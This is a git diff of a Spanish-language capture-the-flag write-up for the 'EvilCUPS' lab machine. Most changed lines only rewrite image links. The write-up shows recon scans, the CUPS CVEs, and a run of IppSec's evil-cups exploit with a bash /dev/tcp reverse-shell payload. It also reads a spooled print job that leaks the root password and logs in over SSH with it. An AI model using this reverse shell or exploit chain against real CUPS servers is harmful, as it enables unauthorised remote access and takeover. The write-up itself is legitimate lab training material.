@@ -24,21 +24,21 @@ lo primero que vamos a hacer es ejecutar los escaneos de nmap:
 ```bash
 nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.11.40 -oG allports
 ```
-![](/assets/images/EvilCUPS/Pastedimage20241107151258.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107151258.png)
 
 ```bash
 nmap -sCV -p22,631 10.10.11.40 -oN ports
 ```
-![](/assets/images/EvilCUPS/Pastedimage20241107151642.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107151642.png)
 vemos que nos da la version de cups que es la 2.4 una version antigua del 2022.
 tambien podemos ver que hay http por lo que alomejor hay una web.
 vamos a usar whatweb para averiguarlo:
 ```bash
 whatweb 10.10.11.40:631
 ```
-![](/assets/images/EvilCUPS/Pastedimage20241107152132.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107152132.png)
 como podemos ver hay algo por lo que vamos a ponerlo en el navegador
-![](/assets/images/EvilCUPS/Pasted image 20241107152436.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pasted image 20241107152436.png)
 nada mas entrar vemos otra vez la version del servicio y multiples enlaces a los cuales podemos acceder.
 antes de ponerme a tocar voy a preferir ejecutar un gobuster para ver si encuentro algo mas
 ```bash
@@ -120,25 +120,30 @@ Progress: 32619 / 7642998 (0.43%)
 no parece aver nada interesante por lo que vamos a tocar la pagina
 si nos vamos a http://10.10.11.40:631/printers/
 veremos lo siguiente:
-![](/assets/images/EvilCUPS/Pastedimage20241107153439.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107153439.png)
 si clicamos sobre Canon_MB2300_series veremos que nos da cierta infromacion de la impresora
 ![](/assets/images/EvilCUPS/Pasted image 20241107153634.png)
 tambien si vemos Show completed jobs saldran las tareas completadas (en vuestro caso solo os saldra una no como a mi que me puse a tocar antes de escribir xdd)
-![](/assets/images/EvilCUPS/Pastedimage20241107153804.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107153804.png)
 como podemos ver hay dos usuarios Withheld y anonymous ( este ultimo es que usado yo y que no os aparecera)
 lo interesante esque tenemos poder sobre el usuario anonymous pero por ejemplo si intentamos haceder a http://10.10.11.40:631/admin nos suelta un 403 forbiden
-![](/assets/images/EvilCUPS/Pastedimage20241107154158.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107154158.png)
 por lo aqui entran los siguientes CVE:
+
 [CVE-2024-47176](https://nvd.nist.gov/vuln/detail/CVE-2024-47176)
+
 [CVE-2024-47076](https://nvd.nist.gov/vuln/detail/CVE-2024-47076)
+
 [CVE-2024-47175](https://nvd.nist.gov/vuln/detail/CVE-2024-47175)
+
 [CVE-2024-47177](https://nvd.nist.gov/vuln/detail/CVE-2024-47177)
+
 basicamente lo que hay que comprobar el puerto 631 por UDP, si esta abierto podemos ejecuatr remote code execution (RCE)
 por lo que podemos usar nmap para ver si es correcto:
 ```bash
 nmap -sU -p631 10.10.11.40
 ```
-![](/assets/images/EvilCUPS/Pastedimage20241107154858.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107154858.png)
 como podemos ver esta abierto por lo que genial (para nostros como atacantes claro)
 vamos a darnos el lujazo de que vamos a usar el siguiente exploit para poder vulnerar el servicio 
 https://github.com/IppSec/evil-cups.git
@@ -176,27 +181,27 @@ python3 evilcups.py 10.10.16.74 10.10.11.40 'nohup bash -c "bash -i >& /dev/tcp/
 ```
 y esperamos unos 30 segundos
 pasados esos 30 segundos si vamos a http://10.10.11.40:631/printers/ veremos la impresora maliciosa
-![](/assets/images/EvilCUPS/Pastedimage20241107160105.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107160105.png)
 si la selecionamos y imprimimos una pagina de ejmplo 
 pum estamos dentro
-![](/assets/images/EvilCUPS/Pastedimage20241107160207.png)
-![](/assets/images/EvilCUPS/Pastedimage20241107160221.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107160207.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107160221.png)
 ahora para el escalado de privilegios 
 ## escalado de privilegios
 hay un directorio cups donde en general se almacena todo. problema no tenemos haceso pero si podemos ejecutar comando:
-![](/assets/images/EvilCUPS/Pastedimage20241107160946.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107160946.png)
 por lo que si investigamos un poco descubrimos que suelen tener una nomeglatura generica los archivos gracias a la documentacion oficial de cups
 por lo que si supuestamente hacemos un:
 ```bash
 cat /var/spool/cups/d00001-001
 ```
 deveria ver una/unas contraseña/s
-![](/assets/images/EvilCUPS/Pastedimage20241107161244.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107161244.png)
 y exacto hay la tenemos.
 si nos la copiamos y con netexect para ver si es de root:
 ```bash
 nxc ssh 10.10.11.40 -u 'root' -p 'Br3@k-G!@ss-r00t-evilcups'
 ```
-![](/assets/images/EvilCUPS/Pastedimage20241107161436.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107161436.png)
 y vemos que si por lo que ya solo es entrar por ssh y somos root
-![](/assets/images/EvilCUPS/Pastedimage20241107161548.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/EvilCUPS/Pastedimage20241107161548.png)
